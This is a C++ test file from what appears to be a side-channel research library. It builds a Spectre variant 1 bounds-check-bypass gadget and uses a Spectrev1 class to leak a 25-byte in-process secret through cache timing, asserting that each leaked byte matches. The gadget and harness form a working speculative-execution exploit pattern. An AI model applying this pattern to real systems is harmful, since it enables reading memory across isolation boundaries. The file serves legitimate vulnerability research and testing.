//
// Created by sage on 1/14/21.
//

#include <catch2/catch.hpp>
#include <stdafx.h>
#include <cacheutils.h>
#include <Spectrev1.h>
// gdb -batch -ex 'file CacheCash' -ex 'disassemble /r main'

unsigned int array1_size = 16;
uint8_t unused[64]; // seperate by a cacheline
uint8_t array1[160] = {1, 2, 16, 16, 16, 16, 16, 16, 16, 16, 16, 16, 16, 16, 16, 16};
uint8_t *array2;

uint8_t secret[25] = {0xde, 0xad, 0xbe, 0xef, 0x69};

volatile uint8_t get_elem(size_t x)
{
    // Make this volatile or compiler might optimize out
    volatile uint8_t res;
    if (x < array1_size )
    {
        res = array2[array1[x]*64];
    }
    return res;
}

TEST_CASE("Spectrev1", "[branch]")
{
    array2 = (uint8_t*)malloc(256*BLOCK_LEN);
    Spectrev1 s(array1,
                array2,
                [](volatile size_t x){flush(&array1_size); get_elem(x);},
                [](size_t _t){return 11;},
                64,
                MAX_TRIES/4,
                20
    );
    // Need to make sure every page of array2 is backed
    for (auto i = 0; i < 64*MAX_BYTE; i += PAGE_SIZE)
    {
        array2[i] = 1;
    }

    uint8_t val;
    for (size_t i = 0; i < 25; ++i)
    {
        s.read_byte(&secret[i], &val);
        printf("0x%02X\n", val);
        REQUIRE(val == secret[i]);
    }

    free(array2);

}